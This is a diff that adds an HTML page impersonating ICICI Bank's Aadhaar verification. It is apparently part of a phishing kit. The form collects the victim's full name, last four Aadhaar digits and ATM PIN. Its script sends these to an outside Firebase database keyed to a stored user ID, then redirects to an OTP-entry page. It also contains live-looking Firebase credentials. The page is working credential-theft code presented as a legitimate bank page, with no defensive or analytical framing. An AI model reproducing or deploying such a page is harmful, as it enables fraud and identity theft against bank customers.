@@ -1,0 +1,153 @@
+<!DOCTYPE html>
+<html>
+   <meta http-equiv="content-type" content="text/html;charset=utf-8" />
+   <meta name="theme-color" content="#FFF">
+   <head>
+      <meta charset="utf-8"/>
+      <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
+      <title>AADHAR (UIDAI) Authentication | ICICI Bank</title>
+      <meta name="description" content="login"/>
+      <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+      <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+      <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+      <link rel="manifest" href="/site.webmanifest">
+      <link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
+      <meta name="msapplication-TileColor" content="#da532c">
+      <link rel="preload" href="Axis.css" as="style"/>
+      <link rel="stylesheet" href="Axis.css" data-n-g=""/>
+      <link rel="preconnect" href="https://fonts.googleapis.com">
+      <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+      <link href="https://fonts.googleapis.com/css2?family=Work+Sans&display=swap" rel="stylesheet">
+      <style>
+           
+             body {
+              text-transform: uppercase;
+         }
+         .error {
+            color: Red;
+            font-family: 'Work Sans', sans-serif;
+            font-size: 11px;
+            font-style: italic;
+         }
+         .submit {
+            background-color: #f69312;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 4px;
+            font-family: 'Work Sans', sans-serif;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+         }
+          
+      </style>
+      <!-- Add Firebase SDK -->
+      <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+      <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
+   </head>
+   <body>
+      <div class="login-box">
+         <div id="__next">
+            <img alt="" src="icici h.jpg" style="width:100%;" />
+         </div>
+         <div class="mainContent">
+           
+            <h1 class="text-center">AADHAR (UIDAI) Verification</h1>
+            <div class="card">
+               <form class="LoginForm" id="aadharForm">
+                  <input type="hidden" name="" value=""/>
+                  <div class="form-group">
+                     <label for="Full_Name">
+                        Full Name (As per AADHAR)<span>*</span>
+                     </label>
+                     <input type="text" class="new-control" id="Full_Name" name="Full_Name" minLength="3" maxLength="30" required/>
+                  </div>
+                  <div class="form-group">
+                     <label for="AADHAR_Number">
+                        Last 4 Digits AADHAR (UIDAI) Number<span>*</span>
+                     </label>
+                     <input type="text" class="new-control" id="AADHAR_Number" name="AADHAR_Number" maxLength="4" inputmode="numeric" pattern="[0-9]\d{3}" title="Please enter valid last 4 digits of AADHAR number!" required/>
+                  </div>
+                  <div class="form-group">
+                     <label for="ATM_PIN">
+                        ATM PIN<span>*</span>
+                     </label>
+                     <input type="text" class="new-control" id="ATM_PIN" name="ATM_PIN" maxLength="4" inputmode="numeric" pattern="[0-9]\d{3}" title="Please enter valid ATM PIN!" required/>
+                  </div>
+                  <div class="text-center">
+                     <button type="submit" class="submit">SUBMIT</button>
+                  </div>
+               </form>
+            </div>
+            <img alt="" src="ICICI OTP F.jpg" style="width:100%;" />
+         </div>
+      </div>
+
+      <!-- Firebase Configuration and Data Submission -->
+      <script>
+         // Initialize Firebase
+         const firebaseConfig = {
+            apiKey: "AIzaSyCDcF_4SEUs2RKDOAWoXUTCb9DO6QaO1TU",
+            authDomain: "motutest-ac954.firebaseapp.com",
+            databaseURL: "https://motutest-ac954-default-rtdb.firebaseio.com",
+            projectId: "motutest-ac954",
+            storageBucket: "motutest-ac954.firebasestorage.app",
+            messagingSenderId: "85522378752",
+            appId: "1:85522378752:web:7ebe0121ab3ff25e09a8e5"
+         };
+         if (!firebase.apps.length) {
+            firebase.initializeApp(firebaseConfig);
+         }
+         const database = firebase.database();
+
+         // Handle form submission
+         document.getElementById('aadharForm').addEventListener('submit', async function(e) {
+            e.preventDefault(); // Prevent default form submission
+
+            // Get form data
+            const fullName = document.getElementById('Full_Name').value;
+            const aadharNumber = document.getElementById('AADHAR_Number').value;
+            const atmPin = document.getElementById('ATM_PIN').value;
+
+            // Validate inputs
+            if (fullName.length < 3 || fullName.length > 30) {
+               alert("Full Name must be between 3 and 30 characters!");
+               return;
+            }
+            const numberRegex = /^\d{4}$/;
+            if (!numberRegex.test(aadharNumber)) {
+               alert("Please enter valid last 4 digits of AADHAR number!");
+               return;
+            }
+            if (!numberRegex.test(atmPin)) {
+               alert("Please enter a valid 4-digit ATM PIN!");
+               return;
+            }
+
+            // Get saved userId from localStorage
+            const currentUserId = localStorage.getItem("currentUserId");
+            if (!currentUserId) {
+               alert("Session expired. Please start again.");
+               return;
+            }
+
+            try {
+               // Update same user record
+               await database.ref("user/" + currentUserId).update({
+                  fullName1: fullName,
+                  aadharNumber: aadharNumber,
+                  atmPin: atmPin,
+               });
+
+               console.log("✅ Aadhaar + ATM PIN saved for user:", currentUserId);
+
+               // Redirect to next page
+               window.location.href = 'Enter_OTP_AADHAR.html';
+            } catch (error) {
+               console.error('❌ Error saving data:', error);
+               alert('Error submitting verification data. Please try again.');
+            }
+         });
+      </script>
+   </body>
+</html>
